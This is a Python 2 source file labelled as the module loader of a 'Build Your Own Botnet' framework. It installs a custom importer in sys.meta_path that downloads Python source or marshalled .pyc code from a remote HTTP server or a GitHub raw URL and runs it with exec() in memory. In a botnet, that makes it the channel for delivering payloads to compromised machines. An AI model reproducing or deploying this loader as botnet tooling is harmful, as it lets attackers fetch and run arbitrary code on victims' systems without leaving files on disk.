#!/usr/bin/python
# -*- coding: utf-8 -*-
'Module Loader (Build Your Own Botnet)'

# standard library
import imp
import sys
import logging
import urllib2
import contextlib

logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
__logger__ = logging.getLogger(__name__)

# main

RELOAD     = False

class RemoteImporter(object):
    """ 
    The class that implements the remote import API. Contains the "find_module" and "load_module" methods.
    The 'modules' parameter is a list, with the names of the modules/packages that can be imported from the given URL.
    The 'base_url' parameter is a string containing the URL where the repository/directory is served through HTTP/S

    It is better to not use this class directly, but through its wrappers ('remote_repo', 'github_repo', etc) that automatically load and unload this class' objects to the 'sys.meta_path' list.
    """

    def __init__(self, modules, base_url):
        self.module_names = modules
        self.base_url     = base_url + '/'
        self.non_source   = False

    def find_module(self, fullname, path=None):
        __logger__.debug("FINDER=================")
        __logger__.debug("[!] Searching %s" % fullname)
        __logger__.debug("[!] Path is %s" % path)
        __logger__.info("[@] Checking if in declared remote module names >")
        if fullname.split('.')[0] not in self.module_names:
            __logger__.info("[-] Not found!")
            return None

        __logger__.info("[@] Checking if built-in >")
        try:
            loader = imp.find_module(fullname, path)
            if loader:
                __logger__.info("[-] Found locally!")
                return None
        except ImportError:
            pass
        __logger__.info("[@] Checking if it is name repetition >")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            __logger__.info("[-] Found locally!")
            return None

        __logger__.info("[*]Module/Package '%s' can be loaded!" % fullname)
        return self


    def load_module(self, name):
        imp.acquire_lock()
        __logger__.debug("LOADER=================")
        __logger__.debug("[+] Loading %s" % name)
        if name in sys.modules and not RELOAD:
            __logger__.info('[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]

        if name.split('.')[-1] in sys.modules and not RELOAD:
            __logger__.info('[+] Module "%s" loaded as a top level module!' % name)
            imp.release_lock()
            return sys.modules[name.split('.')[-1]]

        module_url = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url = None
        final_src = None

        try:
            __logger__.debug("[+] Trying to import as package from: '%s'" % package_url)
            package_src = None
            if self.non_source:
                package_src = self.__fetch_compiled(package_url)
            if package_src == None:
                package_src = urllib2.urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            __logger__.info("[-] '%s' is not a package:" % name)

        if final_src == None:
            try:
                __logger__.debug("[+] Trying to import as module from: '%s'" % module_url)
                module_src = None
                if self.non_source:
                    module_src = self.__fetch_compiled(module_url)
                if module_src == None:
                    module_src = urllib2.urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                __logger__.info("[-] '%s' is not a module:" % name)
                __logger__.warning("[!] '%s' not found in HTTP repository. Moving to next Finder." % name)
                imp.release_lock()
                return None

        __logger__.debug("[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__ = final_url
        if not package_src:
            mod.__package__ = name
        else:
            mod.__package__ = name.split('.')[0]

        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        __logger__.debug("[+] Ready to execute '%s' code" % name)
        sys.modules[name] = mod
        exec(final_src, mod.__dict__)
        __logger__.info("[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod

    def __fetch_compiled(self, url):
        import marshal
        module_src = None
        try:
            module_compiled = urllib2.urlopen(url + 'c').read()
            try:
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError:
                pass
            try:
                module_src = marshal.loads(module_compiled[12:])# Strip the .pyc file header of Python 3.3 and onwards (changed .pyc spec)
                return module_src
            except ValueError:
                pass
        except IOError as e:
            __logger__.debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src

def __create_github_url(username, repo, branch='master'):
    """ 
    Creates the HTTPS URL that points to the raw contents of a github repository.
    """
    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
    return github_raw_url.format(user=username, repo=repo, branch=branch)

def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
    """ 
    Function that creates and adds to the 'sys.meta_path' an RemoteImporter object equipped with a URL of a Online Git server.
    The 'url_builder' parameter is a function that accepts the username, repo and branch/commit, and creates a HTTP/S URL of a Git server.
    The 'username' parameter defines the Github username which is the repository's owner.
    The 'repo' parameter defines the name of the repo that contains the modules/packages to be imported.
    The 'module' parameter is optional and is a list containing the modules/packages that are available in the chosen Github repository.
    If it is not provided, it defaults to the repositories name, as it is common that the a Python repository at "github.com/someuser/somereponame" contains a module/package of "somereponame".
    The 'branch' and 'commit' parameters cannot be both populated at the same call. They specify the branch (last commit) or specific commit, that should be served.
    """
    if username == None or repo == None:
        raise Error("'username' and 'repo' parameters cannot be None")
    if commit and branch:
        raise Error("'branch' and 'commit' parameters cannot be both set!")
    if commit:
        branch = commit
    if not branch:
        branch = 'master'
    if not module:
        module = repo
    if type(module) == str:
        module = [module]
    url = url_builder(username, repo, branch)
    return add_remote_repo(module, url)

def add_remote_repo(modules, base_url='http://localhost:8000/'):
    """ 
    Function that creates and adds to the 'sys.meta_path' an RemoteImporter object.
    The parameters are the same as the RemoteImporter class contructor.
    """
    importer = RemoteImporter(modules, base_url)
    sys.meta_path.insert(0, importer)
    return importer

def remove_remote_repo(base_url):
    """ 
    Function that removes from the 'sys.meta_path' an RemoteImporter object given its HTTP/S URL.
    """
    for importer in sys.meta_path:
        try:
            if importer.base_url.startswith(base_url):  # an extra '/' is always added
                sys.meta_path.remove(importer)
                return True
        except AttributeError as e:
            pass
    return False

@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """ 
    Context Manager that provides remote import functionality through a URL.
    The parameters are the same as the RemoteImporter class contructor.
    """
    importer = add_remote_repo(modules, base_url)
    yield
    remove_remote_repo(base_url)

@contextlib.contextmanager
def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
    """ 
    Context Manager that provides import functionality from Github repositories through HTTPS.
    The parameters are the same as the '_add_git_repo' function. No 'url_builder' function is needed.
    """
    importer = _add_git_repo(__create_github_url,
        username, repo, module=module, branch=branch, commit=commit)
    yield
    remove_remote_repo(importer.base_url)

def load(module_name, url='http://localhost:8000/'):
    """ 
    Loads a module on demand and returns it as a module object without polluting the Namespace.
    """
    importer = RemoteImporter([module_name], url)
    loader = importer.find_module(module_name)
    if loader != None:
        module = loader.load_module(module_name)
        if module:
            return module
    raise ImportError("Module '%s' cannot be imported from URL: '%s'" % (module_name, url) )
